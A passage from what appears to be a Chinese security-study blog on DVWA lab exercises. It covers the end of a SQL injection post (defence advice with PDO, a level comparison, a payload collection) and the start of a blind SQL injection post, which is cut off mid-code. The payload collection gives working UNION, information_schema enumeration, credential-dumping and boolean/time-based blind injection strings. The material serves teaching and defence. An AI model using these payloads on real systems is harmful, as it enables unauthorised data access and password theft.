<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">传统方式：</span><br><span class="line">  用户输入 → 拼接到<span class="keyword">SQL</span> → 作为代码执行 ✗</span><br><span class="line"></span><br><span class="line">预编译方式：</span><br><span class="line">  <span class="keyword">SQL</span>结构 → 先编译</span><br><span class="line">  用户输入 → 只作为数据绑定 → 不会被当作代码 ✓</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>多层防御：</strong></p>
<ol>
<li><p><strong>is_numeric()验证</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>) = <span class="literal">false</span></span><br><span class="line">拒绝！</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>PDO预编译</strong></p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">即使绕过<span class="keyword">is</span><span class="number">_n</span>umeric，PDO也会将输入当作数据</span><br><span class="line">不会被执行为SQL代码</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>参数类型</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PDO::<span class="variable constant_">PARAM_INT</span> - 强制转换为整数</span><br><span class="line"><span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> → <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>攻击尝试全部失败：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试1：字符串注入</span></span><br><span class="line">输入：<span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>() → <span class="literal">false</span> → 拒绝</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试2：纯数字UNION</span></span><br><span class="line">输入：<span class="number">1</span> UNION SELECT ...</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;1 UNION SELECT ...&quot;</span>) → <span class="literal">false</span> → 拒绝</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试3：只输入数字</span></span><br><span class="line">输入：<span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;1&quot;</span>) → <span class="literal">true</span> → 通过</span><br><span class="line">但PDO预编译会将其安全处理</span><br><span class="line">只会查询id=<span class="number">1</span>的记录，无法注入</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用PDO预编译（强烈推荐）"><a href="#1-使用PDO预编译（强烈推荐）" class="headerlink" title="1. 使用PDO预编译（强烈推荐）"></a>1. 使用PDO预编译（强烈推荐）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的做法</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = :id AND name = :name&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$id</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用bindParam</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="number">1</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>

<h4 id="2-使用mysqli预编译"><a href="#2-使用mysqli预编译" class="headerlink" title="2. 使用mysqli预编译"></a>2. 使用mysqli预编译</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysqli预编译</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;i&quot;</span>, <span class="variable">$id</span>); <span class="comment">// i = integer</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br></pre></td></tr></table></figure>

<p><strong>参数类型：</strong></p>
<ul>
<li><code>i</code> - integer（整数）</li>
<li><code>d</code> - double（浮点数）</li>
<li><code>s</code> - string（字符串）</li>
<li><code>b</code> - blob（二进制数据）</li>
</ul>
<h4 id="3-输入验证"><a href="#3-输入验证" class="headerlink" title="3. 输入验证"></a>3. 输入验证</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证ID是否为数字</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid ID&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证邮箱格式</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid email&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用正则表达式</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid username&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-白名单验证"><a href="#4-白名单验证" class="headerlink" title="4. 白名单验证"></a>4. 白名单验证</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许特定值</span></span><br><span class="line"><span class="variable">$allowed_columns</span> = [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$sort_by</span>, <span class="variable">$allowed_columns</span>)) &#123;</span><br><span class="line">    <span class="variable">$sort_by</span> = <span class="string">&#x27;id&#x27;</span>; <span class="comment">// 默认值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">&#123;$sort_by&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="5-最小权限原则"><a href="#5-最小权限原则" class="headerlink" title="5. 最小权限原则"></a>5. 最小权限原则</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 为Web应用创建专用数据库用户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;webapp&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;strong_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 只授予必要的权限</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span> <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;webapp&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 不要授予</span></span><br><span class="line"><span class="comment">-- DROP, DELETE（除非必要）</span></span><br><span class="line"><span class="comment">-- FILE, SUPER, PROCESS（危险权限）</span></span><br></pre></td></tr></table></figure>

<h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><ol>
<li><p><strong>WAF（Web应用防火墙）</strong></p>
<ul>
<li>ModSecurity</li>
<li>Cloudflare WAF</li>
<li>AWS WAF</li>
</ul>
</li>
<li><p><strong>输入输出分离</strong></p>
<ul>
<li>ORM框架（Eloquent, Doctrine）</li>
<li>查询构建器（Query Builder）</li>
</ul>
</li>
<li><p><strong>错误处理</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不要显示详细错误</span></span><br><span class="line"><span class="comment">// mysqli_query($query) or die(mysql_error()); ✗</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录错误，显示通用消息</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$query</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;An error occurred&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h3><ol>
<li><strong>SQLMap</strong> - 自动化SQL注入检测</li>
<li><strong>Burp Suite Scanner</strong> - 漏洞扫描</li>
<li><strong>OWASP ZAP</strong> - 免费安全扫描工具</li>
</ol>
<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>输入过滤</td>
<td>❌</td>
<td>mysqli_escape</td>
<td>mysqli_escape + stripslashes</td>
<td>is_numeric()</td>
</tr>
<tr>
<td>SQL类型</td>
<td>字符串拼接</td>
<td>字符串拼接（无引号）</td>
<td>字符串拼接</td>
<td>PDO预编译</td>
</tr>
<tr>
<td>引号保护</td>
<td>✅ 有引号</td>
<td>❌ 无引号</td>
<td>✅ 有引号</td>
<td>N&#x2F;A</td>
</tr>
<tr>
<td>SESSION</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
<td>❌</td>
</tr>
<tr>
<td>攻击方式</td>
<td>字符串注入</td>
<td>数字注入</td>
<td>字符串注入</td>
<td>无法注入</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>几乎不可能</td>
</tr>
<tr>
<td>典型Payload</td>
<td><code>1&#39; OR &#39;1&#39;=&#39;1</code></td>
<td><code>1 OR 1=1</code></td>
<td><code>1&#39; OR &#39;1&#39;=&#39;1</code></td>
<td>无效</td>
</tr>
</tbody></table>
<hr>
<h2 id="常用SQL注入Payload集合"><a href="#常用SQL注入Payload集合" class="headerlink" title="常用SQL注入Payload集合"></a>常用SQL注入Payload集合</h2><h3 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 单引号测试</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 逻辑测试</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-- 数字注入</span></span><br><span class="line"><span class="comment">1 OR 1=1</span></span><br><span class="line"><span class="comment">1 AND 1=1</span></span><br><span class="line"><span class="comment">1 AND 1=2</span></span><br></pre></td></tr></table></figure>

<h3 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断列数</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 3 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- UNION SELECT</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, 2 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test2&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取信息</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT @@version, database() --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">user</span>(), <span class="built_in">current_user</span>() <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT schema_name, NULL FROM information_schema.schemata --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> table_name, <span class="keyword">NULL</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 列</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 数据</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">user</span>, password <span class="keyword">FROM</span> users <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password), NULL FROM users --</span></span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基于布尔的盲注</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(),1,1)=&#x27;</span>d<span class="string">&#x27; --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> ASCII(<span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">100</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于时间的盲注</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
<ol>
<li><strong>Low难度</strong> - 掌握基本注入技巧</li>
<li><strong>Medium难度</strong> - 理解数字型注入</li>
<li><strong>High难度</strong> - 学习SESSION利用</li>
<li><strong>Impossible难度</strong> - 理解PDO防御原理</li>
</ol>
<p><strong>工具使用：</strong></p>
<ul>
<li>手动测试 → 理解原理</li>
<li>Burp Suite → 自动化重放</li>
<li>SQLMap → 高效利用</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不攻击真实系统</li>
<li>学以致用，保护而非破坏</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/SQL_Injection_Blind_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/SQL_Injection_Blind_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - SQL Injection (Blind) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:26:56" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>21k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>19 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是盲注（Blind-SQL-Injection）？"><a href="#什么是盲注（Blind-SQL-Injection）？" class="headerlink" title="什么是盲注（Blind SQL Injection）？"></a>什么是盲注（Blind SQL Injection）？</h3><p>盲注是一种SQL注入攻击，应用程序不直接返回数据库查询结果或错误信息，攻击者必须通过应用程序的不同响应（如页面内容、HTTP状态码、响应时间）来推断数据库信息。</p>
<p><strong>与普通SQL注入的区别：</strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>普通SQL注入</th>
<th>盲注</th>
</tr>
</thead>
<tbody><tr>
<td>错误信息</td>
<td>直接显示</td>
<td>不显示</td>
</tr>
<tr>
<td>查询结果</td>
<td>直接返回</td>
<td>不返回</td>
</tr>
<tr>
<td>利用方式</td>
<td>UNION查询</td>
<td>布尔&#x2F;时间盲注</td>
</tr>
<tr>
<td>攻击难度</td>
<td>较低</td>
<td>较高</td>
</tr>
<tr>
<td>攻击速度</td>
<td>快</td>
<td>慢（需逐字符猜测）</td>
</tr>
</tbody></table>
<p><strong>盲注的类型：</strong></p>
<h3 id="1-布尔盲注（Boolean-based-Blind-SQL-Injection）"><a href="#1-布尔盲注（Boolean-based-Blind-SQL-Injection）" class="headerlink" title="1. 布尔盲注（Boolean-based Blind SQL Injection）"></a>1. 布尔盲注（Boolean-based Blind SQL Injection）</h3><p>通过True&#x2F;False条件判断，观察页面响应的差异：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 测试条件</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 --   → 返回True（页面正常）</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--   → 返回False（页面异常）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 猜测数据</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=&#x27;</span>a<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>

<p><strong>判断依据：</strong></p>
<ul>
<li>页面内容不同（如”User exists”或”User not found”）</li>
<li>HTTP状态码不同</li>
<li>页面长度不同</li>
</ul>
<h3 id="2-时间盲注（Time-based-Blind-SQL-Injection）"><a href="#2-时间盲注（Time-based-Blind-SQL-Injection）" class="headerlink" title="2. 时间盲注（Time-based Blind SQL Injection）"></a>2. 时间盲注（Time-based Blind SQL Injection）</h3><p>通过数据库延时函数，观察响应时间：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --   → 延迟5秒</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 猜测数据</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=&#x27;</span>a<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br></pre></td></tr></table></figure>

<p><strong>判断依据：</strong></p>
<ul>
<li>响应时间差异（延迟 vs 正常）</li>
</ul>
<p><strong>危害：</strong></p>
<ul>
<li>获取数据库内容（用户名、密码等）</li>
<li>确定数据库类型和版本</li>
<li>枚举数据库结构</li>
<li>获取敏感配置信息</li>
<li>完全控制数据库</li>
</ul>
<p><strong>DVWA场景：</strong><br>通过用户ID查询用户信息，应用只显示”User exists”或”User not found”。</p>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全未过滤，可进行布尔盲注和时间盲注。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 